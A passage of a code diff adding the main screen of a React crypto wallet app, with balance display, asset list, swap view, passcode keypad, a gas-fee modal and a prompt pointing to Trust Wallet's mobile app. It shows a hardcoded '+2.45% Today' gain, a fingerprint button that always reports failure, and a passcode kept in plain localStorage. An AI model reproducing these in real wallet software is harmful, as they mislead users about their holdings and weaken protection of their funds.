+                                                            <button onClick={() => { disconnectWallet(); setShowSettingsMenu(false); }} className="w-full py-4 bg-red-500/10 hover:bg-red-500/20 text-red-500 rounded-2xl font-black uppercase tracking-widest text-[11px] transition-all flex items-center justify-center gap-2">
+                                                                <LogOut className="w-4 h-4" />
+                                                                Disconnect
+                                                            </button>
+                                                        </div>
+                                                    )}
+                                                </div>
+                                            </motion.div>
+                                        </>
+                                    )}
+                                </AnimatePresence>
+                            </div>
+                        </div>
+
+                        {/* Balance */}
+                        <div className="text-center mt-6 mb-10 px-4">
+                            <div className="flex flex-col items-center gap-1">
+                                <p className="text-[11px] font-black uppercase tracking-[0.4em] opacity-30 mb-2">Portfolio Value</p>
+                                <h1 className="text-[52px] font-black tracking-tight leading-none mb-4">
+                                    {address ? (maskAccount ? '••••••' : formatFiat(totalBalance)) : `${currencySymbol}0.00`}
+                                </h1>
+                                <div className={`inline-flex items-center gap-1.5 px-3 py-1 rounded-full text-[11px] font-black ${theme === 'dark' ? 'bg-green-500/10 text-green-400' : 'bg-green-500/5 text-green-600'}`}>
+                                    <ArrowUp className="w-3 h-3" />
+                                    <span>+2.45% Today</span>
+                                </div>
+                            </div>
+                        </div>
+
+                        {/* Main Content Area */}
+                        <div className="px-6 mb-12">
+                            <AnimatePresence mode="wait">
+                                {view === 'wallet' ? (
+                                    <motion.div key="wallet-view" initial={{ opacity: 0, x: -20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -20 }}>
+                                        {/* Actions */}
+                                        <div className="flex justify-center gap-5 mb-12">
+                                            {[
+                                                { label: 'Buy', icon: <Plus className="w-6 h-6" />, action: () => address ? setShowBuyModal(true) : setShowAccountPrompt(true) },
+                                                { label: 'Swap', icon: <ArrowUpDown className="w-6 h-6" />, action: () => setView('swap') },
+                                                { label: 'Send', icon: <ArrowUp className="w-6 h-6" />, action: () => address ? setShowWithdrawModal(true) : setShowAccountPrompt(true) },
+                                                { label: 'Receive', icon: <ArrowDown className="w-6 h-6" />, action: () => address ? setShowRecieveModal(true) : setShowAccountPrompt(true) },
+                                            ].map((btn, i) => (
+                                                <button key={i} onClick={btn.action} className="flex flex-col items-center gap-3 group">
+                                                    <div className="w-16 h-16 rounded-3xl bg-white flex items-center justify-center shadow-xl group-hover:scale-105 transition-all">
+                                                        <div className="text-black">{btn.icon}</div>
+                                                    </div>
+                                                    <span className="text-[11px] font-black uppercase tracking-widest opacity-40 group-hover:opacity-100 transition-opacity">{btn.label}</span>
+                                                </button>
+                                            ))}
+                                        </div>
+
+                                        {/* Asset List */}
+                                        <div className="w-full">
+                                            <div className="relative mb-6">
+                                                <Search className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 opacity-30" />
+                                                <input 
+                                                    type="text" 
+                                                    placeholder="Search crypto..." 
+                                                    value={assetSearchQuery}
+                                                    onChange={(e) => setAssetSearchQuery(e.target.value)}
+                                                    className={`w-full pl-12 pr-4 py-4 rounded-[1.5rem] text-sm font-bold border transition-all ${
+                                                        theme === 'dark' ? 'bg-white/5 border-white/5 focus:border-blue-500/30' : 'bg-gray-50 border-gray-100 focus:border-blue-500/30'
+                                                    }`}
+                                                />
+                                            </div>
+
+                                            <div className={`rounded-[2.5rem] border overflow-hidden ${theme === 'dark' ? 'bg-black border-white/10' : 'bg-white border-gray-100 shadow-xl'}`}>
+                                                <div className="px-8 py-5 flex gap-8 border-b border-white/5">
+                                                    <button onClick={() => setActiveTab('crypto')} className={`text-sm font-black uppercase tracking-widest relative pb-2 ${activeTab === 'crypto' ? 'opacity-100' : 'opacity-30'}`}>
+                                                        Crypto
+                                                        {activeTab === 'crypto' && <div className="absolute bottom-0 left-0 right-0 h-0.5 bg-blue-500 rounded-full" />}
+                                                    </button>
+                                                    <button onClick={() => setActiveTab('history')} className={`text-sm font-black uppercase tracking-widest relative pb-2 ${activeTab === 'history' ? 'opacity-100' : 'opacity-30'}`}>
+                                                        History
+                                                        {activeTab === 'history' && <div className="absolute bottom-0 left-0 right-0 h-0.5 bg-blue-500 rounded-full" />}
+                                                    </button>
+                                                </div>
+
+                                                <div className="p-4 min-h-[400px]">
+                                                    <AnimatePresence mode="wait">
+                                                        {activeTab === 'crypto' ? (
+                                                            <motion.div key="crypto" initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="space-y-3">
+                                                                {!address ? (
+                                                                    <div className="flex flex-col items-center justify-center py-20 text-center px-8">
+                                                                        <div className="w-20 h-20 bg-blue-500/10 rounded-[2.5rem] flex items-center justify-center mb-6">
+                                                                            <ShieldAlert className="w-10 h-10 text-blue-500 opacity-40" />
+                                                                        </div>
+                                                                        <h3 className="text-xl font-black uppercase tracking-widest mb-3 opacity-80">Connect Wallet</h3>
+                                                                        <p className="text-xs font-bold opacity-30 leading-relaxed mb-8">Please connect your wallet to view your asset balances and transaction history.</p>
+                                                                        <button 
+                                                                            onClick={connectWallet}
+                                                                            className="px-8 py-4 bg-blue-500 text-white rounded-2xl font-black uppercase tracking-widest text-[11px] shadow-xl shadow-blue-500/20 active:scale-95 transition-all"
+                                                                        >
+                                                                            Connect Now
+                                                                        </button>
+                                                                    </div>
+                                                                ) : (
+                                                                    <>
+                                                                        {assets.map((asset, idx) => (
+                                                                            <div key={asset.id} onClick={() => handleAssetClick(asset.symbol)} className={`flex items-center justify-between p-5 rounded-3xl border transition-all cursor-pointer group ${
+                                                                                theme === 'dark' ? 'bg-white/5 border-white/5 hover:bg-white/10' : 'bg-gray-50 border-transparent hover:bg-gray-100'
+                                                                            }`}>
+                                                                                <div className="flex items-center gap-4">
+                                                                                    <div className="w-12 h-12 rounded-2xl bg-white p-2.5 shadow-lg group-hover:rotate-3 transition-transform">
+                                                                                        <img src={asset.icon} alt={asset.symbol} className="w-full h-full object-contain" />
+                                                                                    </div>
+                                                                                    <div>
+                                                                                        <p className="font-black text-base">{asset.name}</p>
+                                                                                        <div className="flex items-center gap-2">
+                                                                                            <span className="text-[10px] font-black opacity-30 uppercase tracking-widest">{asset.symbol}</span>
+                                                                                            <span className={`text-[10px] font-black ${asset.priceChange >= 0 ? 'text-green-500' : 'text-red-500'}`}>
+                                                                                                {asset.priceChange >= 0 ? '+' : ''}{asset.priceChange.toFixed(2)}%
+                                                                                            </span>
+                                                                                        </div>
+                                                                                    </div>
+                                                                                </div>
+                                                                                <div className="flex flex-col items-end">
+                                                                                    <div className="h-6 w-20 mb-1">
+                                                                                        <svg className="w-full h-full" viewBox="0 0 100 40">
+                                                                                            <path 
+                                                                                                d={asset.priceChange >= 0 ? "M0 35 Q 25 15, 50 25 T 100 5" : "M0 10 Q 25 35, 50 15 T 100 35"} 
+                                                                                                fill="none" stroke={asset.priceChange >= 0 ? '#22c55e' : '#ef4444'} strokeWidth="4" strokeLinecap="round" 
+                                                                                            />
+                                                                                        </svg>
+                                                                                    </div>
+                                                                                    <p className="font-black text-base">{maskAccount ? '••••' : formatFiat(asset.usdValue)}</p>
+                                                                                    <p className="text-[10px] font-bold opacity-20">{`${asset.balance.toFixed(4)} ${asset.symbol}`}</p>
+                                                                                </div>
+                                                                            </div>
+                                                                        ))}
+                                                                    </>
+                                                                )}
+                                                            </motion.div>
+                                                        ) : (
+                                                            <motion.div key="history" initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
+                                                                <TransactionHistory
+                                                                    transactions={transactions}
+                                                                    marketPrices={marketPrices}
+                                                                    currencySymbol={currencySymbol}
+                                                                    fxRate={fxRate}
+                                                                    maskAccount={maskAccount}
+                                                                    address={address}
+                                                                    onConnect={connectWallet}
+                                                                    theme={theme}
+                                                                />
+                                                            </motion.div>
+                                                        )}
+                                                    </AnimatePresence>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </motion.div>
+                                ) : view === 'swap' ? (
+                                    <motion.div key="swap-view" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: 20 }}>
+                                        <SwapModal 
+                                            address={address} 
+                                            isOpen={true} 
+                                            onClose={() => setView('wallet')} 
+                                            onSuccess={fetchTransactionsData} 
+                                            initialFromToken={selectedAssetForSwap} 
+                                            bnbBalance={bnbBalance} 
+                                            t22Balance={t22Balance} 
+                                            currencySymbol={currencySymbol} 
+                                            fxRate={fxRate} 
+                                            theme={theme} 
+                                            isInline={true}
+                                        />
+                                    </motion.div>
+                                ) : (
+                                    <motion.div key="coming-soon" initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="py-20 text-center">
+                                        <div className="w-20 h-20 bg-blue-500/10 rounded-[2rem] flex items-center justify-center mx-auto mb-6">
+                                            <Plus className="w-10 h-10 text-blue-500" />
+                                        </div>
+                                        <h2 className="text-2xl font-black uppercase tracking-widest mb-2">{view} View</h2>
+                                        <p className="text-sm opacity-40">This feature is coming soon.</p>
+                                        <button onClick={() => setView('wallet')} className="mt-8 px-8 py-3 bg-blue-500 text-white rounded-xl font-black uppercase tracking-widest text-[11px]">Back to Wallet</button>
+                                    </motion.div>
+                                )}
+                            </AnimatePresence>
+                        </div>
+                    </div>
+                </motion.div>
+            </motion.div>
+
+            {/* Native Tab Bar */}
+            {!showSettingsMenu && (
+                <div className={`fixed bottom-0 left-0 right-0 z-[100] backdrop-blur-2xl border-t safe-area-inset-bottom md:hidden ${
+                    theme === 'dark' ? 'bg-black/80 border-white/10' : 'bg-white/90 border-gray-100 shadow-2xl'
+                }`}>
+                    <div className="flex justify-around items-center px-2 py-4">
+                        {[
+                            { label: 'Wallet', icon: <Wallet className="w-5 h-5" />, active: view === 'wallet', action: () => setView('wallet') },
+                            { label: 'Swap', icon: <ArrowUpDown className="w-5 h-5" />, active: view === 'swap', action: () => setView('swap') },
+                            { label: 'Send', icon: <ArrowUp className="w-5 h-5" />, action: () => address ? setShowWithdrawModal(true) : setShowAccountPrompt(true) },
+                            { label: 'Settings', icon: <Settings2 className="w-5 h-5" />, action: () => setShowSettingsMenu(true) },
+                        ].map((tab, i) => (
+                            <button key={i} onClick={tab.action} className="flex flex-col items-center gap-1.5 flex-1 relative">
+                                <div className={`${tab.active ? 'text-blue-500' : 'opacity-30'}`}>{tab.icon}</div>
+                                <span className={`text-[9px] font-black uppercase tracking-widest ${tab.active ? 'text-blue-500' : 'opacity-20'}`}>{tab.label}</span>
+                            </button>
+                        ))}
+                    </div>
+                </div>
+            )}
+
+            {/* Desktop Footer */}
+            <div className="hidden md:block fixed bottom-8 left-1/2 -translate-x-1/2 z-50">
+                <div className={`px-6 py-3 rounded-full backdrop-blur-xl border shadow-2xl flex items-center gap-4 ${theme === 'dark' ? 'bg-black/50 border-white/10' : 'bg-white/80 border-gray-100'}`}>
+                    <div className="flex items-center gap-2">
+                        <div className={`w-1.5 h-1.5 rounded-full ${address ? 'bg-green-500 shadow-[0_0_8px_#22c55e]' : 'bg-yellow-500'} animate-pulse`} />
+                        <span className="text-[10px] font-black uppercase tracking-widest opacity-40">{address ? 'Connected' : 'Not Connected'}</span>
+                    </div>
+                    {address && (
+                        <>
+                            <div className="w-[1px] h-3 bg-white/10" />
+                            <button onClick={() => disconnectWallet()} className="text-[10px] font-black uppercase tracking-widest text-red-500/60 hover:text-red-500 transition-colors">Disconnect</button>
+                        </>
+                    )}
+                </div>
+            </div>
+
+            {/* Modals */}
+            <WithdrawalModal isOpen={showWithdrawModal} onClose={() => setShowWithdrawModal(false)} bnbBalance={bnbBalance} t22Balance={t22Balance} maskAccount={maskAccount} currencySymbol={currencySymbol} fxRate={fxRate} theme={theme} onSuccess={fetchTransactionsData} />
+            <SwapModal address={address} isOpen={showSwapModal} onClose={() => setShowSwapModal(false)} onSuccess={fetchTransactionsData} initialFromToken={selectedAssetForSwap} bnbBalance={bnbBalance} t22Balance={t22Balance} currencySymbol={currencySymbol} fxRate={fxRate} theme={theme} />
+            <BuyModal address={address} isOpen={showBuyModal} onClose={() => setShowBuyModal(false)} theme={theme} onSuccess={fetchTransactionsData} />
+            <GasFeeModal isOpen={showGasFeeModal} onClose={() => setShowGasFeeModal(false)} theme={theme} user={address} onSuccess={addGasFeeTransaction} />
+            <ReceiveModal isOpen={showRecieveModal} onClose={() => setShowRecieveModal(false)} currencySymbol={currencySymbol} fxRate={fxRate} theme={theme} />
+            
+            <AnimatePresence>
+                {showAccountPrompt && (
+                    <div className="fixed inset-0 z-[200] flex items-center justify-center p-6">
+                        <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="absolute inset-0 bg-black/80 backdrop-blur-md" onClick={() => setShowAccountPrompt(false)} />
+                        <motion.div initial={{ scale: 0.9, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} exit={{ scale: 0.9, opacity: 0 }} className={`relative w-full max-w-sm rounded-[3rem] p-10 text-center border shadow-2xl ${theme === 'dark' ? 'bg-black border-white/10' : 'bg-white border-transparent'}`}>
+                            <div className="w-20 h-20 bg-blue-500/10 rounded-full flex items-center justify-center mx-auto mb-6">
+                                <Wallet className="w-10 h-10 text-blue-500" />
+                            </div>
+                            <h3 className="text-2xl font-black mb-2">Connect Wallet</h3>
+                            <p className="text-sm opacity-40 mb-8">Please connect your wallet to continue with this action.</p>
+                            <button onClick={() => { setShowAccountPrompt(false); connectWallet(); }} className="w-full py-4 bg-blue-500 hover:bg-blue-600 text-white rounded-2xl font-black uppercase tracking-widest transition-all">Connect Now</button>
+                        </motion.div>
+                    </div>
+                )}
+            </AnimatePresence>
+            <AnimatePresence>
+                {showPinModal && (
+                    <div className="fixed inset-0 z-[250] flex items-center justify-center p-6">
+                        <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className={`absolute inset-0 backdrop-blur-xl ${theme === 'dark' ? 'bg-black/95' : 'bg-white/95'}`} />
+                        <motion.div initial={{ y: 20, opacity: 0 }} animate={{ y: 0, opacity: 1 }} exit={{ y: 20, opacity: 0 }} className={`relative w-full max-w-xs text-center ${theme === 'dark' ? 'text-white' : 'text-black'}`}>
+                            <div className="mb-12">
+                                <Shield className="w-12 h-12 text-blue-500 mx-auto mb-4" />
+                                <h3 className="text-xl font-bold">
+                                    {pinStep === 'setup' ? 'Set Passcode' : pinStep === 'confirm' ? 'Confirm Passcode' : 'Enter Passcode'}
+                                </h3>
+                                <p className="text-sm opacity-40 mt-1">
+                                    {pinStep === 'setup' ? 'Create a 6-digit passcode' : pinStep === 'confirm' ? 'Repeat your passcode' : 'Access your wallet'}
+                                </p>
+                                {pinMessage && (
+                                    <motion.p 
+                                        initial={{ opacity: 0, y: -10 }} 
+                                        animate={{ opacity: 1, y: 0 }} 
+                                        className={`text-[10px] font-bold mt-2 ${pinMessage.isError ? 'text-red-500' : 'text-green-500'}`}
+                                    >
+                                        {pinMessage.text}
+                                    </motion.p>
+                                )}
+                            </div>
+
+                            <div className="flex justify-center gap-4 mb-16">
+                                {[...Array(6)].map((_, i) => (
+                                    <div key={i} className={`w-3.5 h-3.5 rounded-full border-2 transition-all duration-200 ${
+                                        (pinStep === 'confirm' ? confirmPin : pin).length > i 
+                                        ? 'bg-blue-500 border-blue-500 scale-110' 
+                                        : theme === 'dark' ? 'border-white/20' : 'border-black/10'
+                                    }`} />
+                                ))}
+                            </div>
+
+                            <div className="grid grid-cols-3 gap-6 max-w-[280px] mx-auto">
+                                {[1, 2, 3, 4, 5, 6, 7, 8, 9, 'bio', 0, 'del'].map((num, i) => (
+                                    <button
+                                        key={i}
+                                        disabled={num === ''}
+                                        onClick={() => {
+                                            if (num === 'bio') {
+                                                setPinMessage({ text: 'Biometric failed. Please try again later.', isError: true });
+                                                setTimeout(() => setPinMessage(null), 3000);
+                                                return;
+                                            }
+                                            if (num === 'del') {
+                                                if (pinStep === 'confirm') setConfirmPin(p => p.slice(0, -1));
+                                                else setPin(p => p.slice(0, -1));
+                                                return;
+                                            }
+                                            
+                                            const current = pinStep === 'confirm' ? confirmPin : pin;
+                                            if (current.length >= 6) return;
+                                            
+                                            const next = current + num;
+                                            if (pinStep === 'confirm') {
+                                                setConfirmPin(next);
+                                                if (next.length === 6) {
+                                                    if (next === pin) {
+                                                        localStorage.setItem('appPin', next);
+                                                        setSavedPin(next);
+                                                        setIsAppLockEnabled(true);
+                                                        setShowPinModal(false);
+                                                        setPinMessage({ text: 'Passcode saved successfully', isError: false });
+                                                        setTimeout(() => setPinMessage(null), 2000);
+                                                    } else {
+                                                        setPinMessage({ text: 'Passcodes do not match. Try again.', isError: true });
+                                                        setTimeout(() => setPinMessage(null), 3000);
+                                                        setPin('');
+                                                        setConfirmPin('');
+                                                        setPinStep('setup');
+                                                    }
+                                                }
+                                            } else {
+                                                setPin(next);
+                                                if (next.length === 6) {
+                                                    setPinStep('confirm');
+                                                }
+                                            }
+                                        }}
+                                        className={`w-16 h-16 rounded-full flex items-center justify-center text-2xl font-bold transition-all active:scale-90 ${
+                                            num === '' ? 'opacity-0' : (theme === 'dark' ? 'bg-white/5 hover:bg-white/10' : 'bg-black/5 hover:bg-black/10')
+                                        }`}
+                                    >
+                                        {num === 'del' ? <X className="w-6 h-6" /> : num === 'bio' ? <Fingerprint className="w-8 h-8 text-blue-500" /> : num}
+                                    </button>
+                                ))}
+                            </div>
+
+                            <button onClick={() => setShowPinModal(false)} className="mt-12 text-sm font-bold text-blue-500 opacity-60 hover:opacity-100 transition-opacity">
+                                Cancel
+                            </button>
+                        </motion.div>
+                    </div>
+                )}
+            </AnimatePresence>
+            <AnimatePresence>
+                {showMobilePrompt && (
+                    <div className="fixed inset-0 z-[300] flex items-center justify-center p-6">
+                        <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="absolute inset-0 bg-black/80 backdrop-blur-md" onClick={() => setShowMobilePrompt(false)} />
+                        <motion.div initial={{ y: 20, opacity: 0 }} animate={{ y: 0, opacity: 1 }} exit={{ y: 20, opacity: 0 }} className={`relative w-full max-w-sm rounded-[3rem] p-8 text-center border shadow-2xl ${theme === 'dark' ? 'bg-[#0a0b0d] border-white/10' : 'bg-white border-transparent'}`}>
+                            <div className="w-20 h-20 bg-blue-500/10 rounded-[2rem] flex items-center justify-center mx-auto mb-6">
+                                <Globe className="w-10 h-10 text-blue-500" />
+                            </div>
+                            <h3 className="text-2xl font-black mb-3 leading-tight">Continue on the Mobile App?</h3>
+                            <p className="text-sm opacity-40 mb-8 px-4">For a more secure and seamless DApp experience, we recommend using the official Trust Wallet mobile application.</p>
+                            
+                            <div className="space-y-3">
+                                <a 
+                                    href="https://trustwallet.com/download" 
+                                    target="_blank" 
+                                    rel="noopener noreferrer"
+                                    onClick={() => setShowMobilePrompt(false)}
+                                    className="w-full py-4 bg-blue-500 hover:bg-blue-600 !text-white rounded-2xl font-black uppercase tracking-widest transition-all block text-center text-[11px]"
+                                >
+                                    Open Mobile App
+                                </a>
+                                <button 
+                                    onClick={() => {
+                                        window.open(pendingDappUrl, '_blank');
+                                        setShowMobilePrompt(false);
+                                    }}
+                                    className={`w-full py-4 rounded-2xl font-black uppercase tracking-widest transition-all text-[11px] border ${
+                                        theme === 'dark' ? 'bg-white/5 border-white/5 hover:bg-white/10 text-white' : 'bg-gray-50 border-gray-100 hover:bg-gray-100 text-black'
+                                    }`}
+                                >
+                                    Continue in Browser
+                                </button>
+                            </div>
+                            
+                            <button onClick={() => setShowMobilePrompt(false)} className="mt-6 text-[10px] font-black uppercase tracking-widest opacity-20 hover:opacity-100 transition-opacity">
+                                Maybe Later
+                            </button>
+                        </motion.div>
+                    </div>
+                )}
+            </AnimatePresence>
+        </div>
+    );
+}
